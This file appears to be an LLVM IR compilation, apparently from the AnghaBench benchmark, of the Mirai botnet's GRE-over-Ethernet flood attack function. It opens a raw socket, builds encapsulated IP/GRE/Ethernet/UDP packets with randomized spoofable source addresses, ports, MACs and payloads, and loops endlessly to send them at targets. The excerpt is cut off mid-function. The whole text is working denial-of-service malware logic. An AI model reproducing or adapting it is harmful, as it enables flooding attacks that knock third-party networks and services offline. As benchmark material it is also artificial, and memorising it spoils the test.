; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_gre.c_attack_gre_eth.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_gre.c_attack_gre_eth.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, i32, %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i64, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.attack_option = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i32, i32, i8*, i32, i8*, i8* }
%struct.grehdr = type { i8* }
%struct.ethhdr = type { i64, i64, i8* }
%struct.udphdr = type { i32, i32, i8*, i64 }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_RAND = common dso_local global i32 0, align 4
@ATK_OPT_GRE_CONSTIP = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_SOURCE = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@IPPROTO_GRE = common dso_local global i32 0, align 4
@PROTO_GRE_TRANS_ETH = common dso_local global i32 0, align 4
@ETH_P_IP = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_gre_eth(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %40 = load i32, i32* %5, align 4
  %41 = call i8* @calloc(i32 %40, i32 8)
  %42 = bitcast i8* %41 to i8**
  store i8** %42, i8*** %11, align 8
  %43 = load i32, i32* %7, align 4
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %46 = call i8* @attack_get_opt_int(i32 %43, %struct.attack_option* %44, i32 %45, i32 0)
  %47 = ptrtoint i8* %46 to i32
  store i32 %47, i32* %12, align 4
  %48 = load i32, i32* %7, align 4
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %51 = call i8* @attack_get_opt_int(i32 %48, %struct.attack_option* %49, i32 %50, i32 65535)
  %52 = ptrtoint i8* %51 to i32
  store i32 %52, i32* %13, align 4
  %53 = load i32, i32* %7, align 4
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %56 = call i8* @attack_get_opt_int(i32 %53, %struct.attack_option* %54, i32 %55, i32 64)
  %57 = ptrtoint i8* %56 to i32
  store i32 %57, i32* %14, align 4
  %58 = load i32, i32* %7, align 4
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %61 = load i32, i32* @TRUE, align 4
  %62 = call i8* @attack_get_opt_int(i32 %58, %struct.attack_option* %59, i32 %60, i32 %61)
  store i8* %62, i8** %15, align 8
  %63 = load i32, i32* %7, align 4
  %64 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %65 = load i32, i32* @ATK_OPT_SPORT, align 4
  %66 = call i8* @attack_get_opt_int(i32 %63, %struct.attack_option* %64, i32 %65, i32 65535)
  %67 = ptrtoint i8* %66 to i32
  store i32 %67, i32* %16, align 4
  %68 = load i32, i32* %7, align 4
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = load i32, i32* @ATK_OPT_DPORT, align 4
  %71 = call i8* @attack_get_opt_int(i32 %68, %struct.attack_option* %69, i32 %70, i32 65535)
  %72 = ptrtoint i8* %71 to i32
  store i32 %72, i32* %17, align 4
  %73 = load i32, i32* %7, align 4
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %76 = call i8* @attack_get_opt_int(i32 %73, %struct.attack_option* %74, i32 %75, i32 512)
  %77 = ptrtoint i8* %76 to i32
  store i32 %77, i32* %18, align 4
  %78 = load i32, i32* %7, align 4
  %79 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %80 = load i32, i32* @ATK_OPT_PAYLOAD_RAND, align 4
  %81 = load i32, i32* @TRUE, align 4
  %82 = call i8* @attack_get_opt_int(i32 %78, %struct.attack_option* %79, i32 %80, i32 %81)
  store i8* %82, i8** %19, align 8
  %83 = load i32, i32* %7, align 4
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = load i32, i32* @ATK_OPT_GRE_CONSTIP, align 4
  %86 = load i32, i32* @FALSE, align 4
  %87 = call i8* @attack_get_opt_int(i32 %83, %struct.attack_option* %84, i32 %85, i32 %86)
  store i8* %87, i8** %20, align 8
  %88 = load i32, i32* %7, align 4
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = load i32, i32* @ATK_OPT_SOURCE, align 4
  %91 = load i32, i32* @LOCAL_ADDR, align 4
  %92 = call i8* @attack_get_opt_int(i32 %88, %struct.attack_option* %89, i32 %90, i32 %91)
  %93 = ptrtoint i8* %92 to i32
  store i32 %93, i32* %21, align 4
  %94 = load i32, i32* @AF_INET, align 4
  %95 = load i32, i32* @SOCK_RAW, align 4
  %96 = load i32, i32* @IPPROTO_TCP, align 4
  %97 = call i32 @socket(i32 %94, i32 %95, i32 %96)
  store i32 %97, i32* %10, align 4
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %99, label %100

99:                                               ; preds = %4
  br label %476

100:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = load i32, i32* @IPPROTO_IP, align 4
  %103 = load i32, i32* @IP_HDRINCL, align 4
  %104 = call i32 @setsockopt(i32 %101, i32 %102, i32 %103, i32* %9, i32 4)
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %109

106:                                              ; preds = %100
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  br label %476

109:                                              ; preds = %100
  store i32 0, i32* %9, align 4
  br label %110

110:                                              ; preds = %259, %109
  %111 = load i32, i32* %9, align 4
  %112 = load i32, i32* %5, align 4
  %113 = icmp slt i32 %111, %112
  br i1 %113, label %114, label %262

114:                                              ; preds = %110
  %115 = call i8* @calloc(i32 1510, i32 8)
  %116 = load i8**, i8*** %11, align 8
  %117 = load i32, i32* %9, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8*, i8** %116, i64 %118
  store i8* %115, i8** %119, align 8
  %120 = load i8**, i8*** %11, align 8
  %121 = load i32, i32* %9, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %120, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  store %struct.iphdr* %125, %struct.iphdr** %22, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i64 1
  %128 = bitcast %struct.iphdr* %127 to %struct.grehdr*
  store %struct.grehdr* %128, %struct.grehdr** %23, align 8
  %129 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %130 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %129, i64 1
  %131 = bitcast %struct.grehdr* %130 to %struct.ethhdr*
  store %struct.ethhdr* %131, %struct.ethhdr** %24, align 8
  %132 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %133 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %132, i64 1
  %134 = bitcast %struct.ethhdr* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %25, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.udphdr*
  store %struct.udphdr* %137, %struct.udphdr** %26, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 0
  store i32 4, i32* %139, align 8
  %140 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 1
  store i32 5, i32* %141, align 4
  %142 = load i32, i32* %12, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i32 %142, i32* %144, align 8
  %145 = load i32, i32* %18, align 4
  %146 = sext i32 %145 to i64
  %147 = add i64 184, %146
  %148 = trunc i64 %147 to i32
  %149 = call i8* @htons(i32 %148)
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 10
  store i8* %149, i8** %151, align 8
  %152 = load i32, i32* %13, align 4
  %153 = call i8* @htons(i32 %152)
  %154 = ptrtoint i8* %153 to i32
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i32 %154, i32* %156, align 4
  %157 = load i32, i32* %14, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i32 %157, i32* %159, align 8
  %160 = load i8*, i8** %15, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %166

162:                                              ; preds = %114
  %163 = call i8* @htons(i32 16384)
  %164 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 9
  store i8* %163, i8** %165, align 8
  br label %166

166:                                              ; preds = %162, %114
  %167 = load i32, i32* @IPPROTO_GRE, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 8
  %170 = load i32, i32* %21, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 5
  store i32 %170, i32* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i32 %178, i32* %180, align 8
  %181 = load i32, i32* @PROTO_GRE_TRANS_ETH, align 4
  %182 = call i8* @htons(i32 %181)
  %183 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %184 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %183, i32 0, i32 0
  store i8* %182, i8** %184, align 8
  %185 = load i32, i32* @ETH_P_IP, align 4
  %186 = call i8* @htons(i32 %185)
  %187 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %188 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %187, i32 0, i32 2
  store i8* %186, i8** %188, align 8
  %189 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 0
  store i32 4, i32* %190, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 1
  store i32 5, i32* %192, align 4
  %193 = load i32, i32* %12, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 2
  store i32 %193, i32* %195, align 8
  %196 = load i32, i32* %18, align 4
  %197 = sext i32 %196 to i64
  %198 = add i64 88, %197
  %199 = trunc i64 %198 to i32
  %200 = call i8* @htons(i32 %199)
  %201 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 10
  store i8* %200, i8** %202, align 8
  %203 = load i32, i32* %13, align 4
  %204 = xor i32 %203, -1
  %205 = call i8* @htons(i32 %204)
  %206 = ptrtoint i8* %205 to i32
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 3
  store i32 %206, i32* %208, align 4
  %209 = load i32, i32* %14, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 4
  store i32 %209, i32* %211, align 8
  %212 = load i8*, i8** %15, align 8
  %213 = icmp ne i8* %212, null
  br i1 %213, label %214, label %218

214:                                              ; preds = %166
  %215 = call i8* @htons(i32 16384)
  %216 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 9
  store i8* %215, i8** %217, align 8
  br label %218

218:                                              ; preds = %214, %166
  %219 = load i32, i32* @IPPROTO_UDP, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 8
  store i32 %219, i32* %221, align 8
  %222 = call i32 (...) @rand_next()
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 5
  store i32 %222, i32* %224, align 4
  %225 = load i8*, i8** %20, align 8
  %226 = icmp ne i8* %225, null
  br i1 %226, label %227, label %233

227:                                              ; preds = %218
  %228 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 6
  %230 = load i32, i32* %229, align 8
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 6
  store i32 %230, i32* %232, align 8
  br label %241

233:                                              ; preds = %218
  %234 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 5
  %236 = load i32, i32* %235, align 4
  %237 = sub nsw i32 %236, 1024
  %238 = xor i32 %237, -1
  %239 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 6
  store i32 %238, i32* %240, align 8
  br label %241

241:                                              ; preds = %233, %227
  %242 = load i32, i32* %16, align 4
  %243 = call i8* @htons(i32 %242)
  %244 = ptrtoint i8* %243 to i32
  %245 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  store i32 %244, i32* %246, align 8
  %247 = load i32, i32* %17, align 4
  %248 = call i8* @htons(i32 %247)
  %249 = ptrtoint i8* %248 to i32
  %250 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 1
  store i32 %249, i32* %251, align 4
  %252 = load i32, i32* %18, align 4
  %253 = sext i32 %252 to i64
  %254 = add i64 24, %253
  %255 = trunc i64 %254 to i32
  %256 = call i8* @htons(i32 %255)
  %257 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %258 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %257, i32 0, i32 2
  store i8* %256, i8** %258, align 8
  br label %259

259:                                              ; preds = %241
  %260 = load i32, i32* %9, align 4
  %261 = add nsw i32 %260, 1
  store i32 %261, i32* %9, align 4
  br label %110

262:                                              ; preds = %110
  br label %263

263:                                              ; preds = %475, %262
  %264 = load i32, i32* @TRUE, align 4
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %266, label %476

266:                                              ; preds = %263
  store i32 0, i32* %9, align 4
  br label %267

267:                                              ; preds = %472, %266
  %268 = load i32, i32* %9, align 4
  %269 = load i32, i32* %5, align 4
  %270 = icmp slt i32 %268, %269
  br i1 %270, label %271, label %475

271:                                              ; preds = %267
  %272 = load i8**, i8*** %11, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds i8*, i8** %272, i64 %274
  %276 = load i8*, i8** %275, align 8
  store i8* %276, i8** %30, align 8
  %277 = load i8*, i8** %30, align 8
  %278 = bitcast i8* %277 to %struct.iphdr*
  store %struct.iphdr* %278, %struct.iphdr** %31, align 8
  %279 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i64 1
  %281 = bitcast %struct.iphdr* %280 to %struct.grehdr*
  store %struct.grehdr* %281, %struct.grehdr** %32, align 8
  %282 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %283 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %282, i64 1
  %284 = bitcast %struct.grehdr* %283 to %struct.ethhdr*
  store %struct.ethhdr* %284, %struct.ethhdr** %33, align 8
  %285 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %286 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %285, i64 1
  %287 = bitcast %struct.ethhdr* %286 to %struct.iphdr*
  store %struct.iphdr* %287, %struct.iphdr** %34, align 8
  %288 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i64 1
  %290 = bitcast %struct.iphdr* %289 to %struct.udphdr*
  store %struct.udphdr* %290, %struct.udphdr** %35, align 8
  %291 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %292 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %291, i64 1
  %293 = bitcast %struct.udphdr* %292 to i8*
  store i8* %293, i8** %36, align 8
  %294 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 1
  %299 = load i32, i32* %298, align 4
  %300 = icmp slt i32 %299, 32
  br i1 %300, label %301, label %322

301:                                              ; preds = %271
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 8
  %308 = call i64 @ntohl(i32 %307)
  %309 = call i32 (...) @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = ashr i32 %309, %315
  %317 = sext i32 %316 to i64
  %318 = add nsw i64 %308, %317
  %319 = call i32 @htonl(i64 %318)
  %320 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 6
  store i32 %319, i32* %321, align 8
  br label %322

322:                                              ; preds = %301, %271
  %323 = load i32, i32* %21, align 4
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %325, label %329

325:                                              ; preds = %322
  %326 = call i32 (...) @rand_next()
  %327 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 5
  store i32 %326, i32* %328, align 4
  br label %329

329:                                              ; preds = %325, %322
  %330 = load i32, i32* %13, align 4
  %331 = icmp eq i32 %330, 65535
  br i1 %331, label %332, label %344

332:                                              ; preds = %329
  %333 = call i32 (...) @rand_next()
  %334 = and i32 %333, 65535
  %335 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 3
  store i32 %334, i32* %336, align 4
  %337 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  %339 = load i32, i32* %338, align 4
  %340 = sub nsw i32 %339, 1000
  %341 = xor i32 %340, -1
  %342 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 3
  store i32 %341, i32* %343, align 4
  br label %344

344:                                              ; preds = %332, %329
  %345 = load i32, i32* %16, align 4
  %346 = icmp eq i32 %345, 65535
  br i1 %346, label %347, label %352

347:                                              ; preds = %344
  %348 = call i32 (...) @rand_next()
  %349 = and i32 %348, 65535
  %350 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 0
  store i32 %349, i32* %351, align 8
  br label %352

352:                                              ; preds = %347, %344
  %353 = load i32, i32* %17, align 4
  %354 = icmp eq i32 %353, 65535
  br i1 %354, label %355, label %360

355:                                              ; preds = %352
  %356 = call i32 (...) @rand_next()
  %357 = and i32 %356, 65535
  %358 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i32 0, i32 1
  store i32 %357, i32* %359, align 4
  br label %360

360:                                              ; preds = %355, %352
  %361 = load i8*, i8** %20, align 8
  %362 = icmp ne i8* %361, null
  br i1 %362, label %367, label %363

363:                                              ; preds = %360
  %364 = call i32 (...) @rand_next()
  %365 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 6
  store i32 %364, i32* %366, align 8
  br label %373

367:                                              ; preds = %360
  %368 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 6
  %370 = load i32, i32* %369, align 8
  %371 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 6
  store i32 %370, i32* %372, align 8
  br label %373

373:                                              ; preds = %367, %363
  %374 = call i32 (...) @rand_next()
  store i32 %374, i32* %37, align 4
  %375 = call i32 (...) @rand_next()
  store i32 %375, i32* %38, align 4
  %376 = call i32 (...) @rand_next()
  store i32 %376, i32* %39, align 4
  %377 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %378 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %377, i32 0, i32 1
  %379 = load i64, i64* %378, align 8
  %380 = bitcast i32* %37 to i8*
  %381 = call i32 @util_memcpy(i64 %379, i8* %380, i32 4)
  %382 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %383 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %382, i32 0, i32 0
  %384 = load i64, i64* %383, align 8
  %385 = bitcast i32* %38 to i8*
  %386 = call i32 @util_memcpy(i64 %384, i8* %385, i32 4)
  %387 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %388 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %387, i32 0, i32 1
  %389 = load i64, i64* %388, align 8
  %390 = add nsw i64 %389, 4
  %391 = bitcast i32* %39 to i8*
  %392 = call i32 @util_memcpy(i64 %390, i8* %391, i32 2)
  %393 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %394 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %393, i32 0, i32 0
  %395 = load i64, i64* %394, align 8
  %396 = add nsw i64 %395, 4
  %397 = bitcast i32* %39 to i8*
  %398 = getelementptr inbounds i8, i8* %397, i64 2
  %399 = call i32 @util_memcpy(i64 %396, i8* %398, i32 2)
  %400 = load i8*, i8** %19, align 8
  %401 = icmp ne i8* %400, null
  br i1 %401, label %402, label %406

402:                                              ; preds = %373
  %403 = load i8*, i8** %36, align 8
  %404 = load i32, i32* %18, align 4
  %405 = call i32 @rand_str(i8* %403, i32 %404)
  br label %406

406:                                              ; preds = %402, %373
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i8* null, i8** %408, align 8
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = bitcast %struct.iphdr* %409 to i32*
  %411 = call i8* @checksum_generic(i32* %410, i32 64)
  %412 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 7
  store i8* %411, i8** %413, align 8
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i8* null, i8** %415, align 8
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = bitcast %struct.iphdr* %416 to i32*
  %418 = call i8* @checksum_generic(i32* %417, i32 64)
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i8* %418, i8** %420, align 8
  %421 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 3
  store i64 0, i64* %422, align 8
  %423 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %424 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %425 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %426 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %425, i32 0, i32 2
  %427 = load i8*, i8** %426, align 8
  %428 = load i32, i32* %18, align 4
  %429 = sext i32 %428 to i64
  %430 = add i64 24, %429
  %431 = trunc i64 %430 to i32
  %432 = call i64 @checksum_tcpudp(%struct.iphdr* %423, %struct.udphdr* %424, i8* %427, i32 %431)
  %433 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %434 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %433, i32 0, i32 3
  store i64 %432, i64* %434, align 8
  %435 = load i32, i32* @AF_INET, align 4
  %436 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %437 = load i32, i32* %9, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i64 %438
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %439, i32 0, i32 2
  %441 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %440, i32 0, i32 2
  store i32 %435, i32* %441, align 4
  %442 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 6
  %444 = load i32, i32* %443, align 8
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
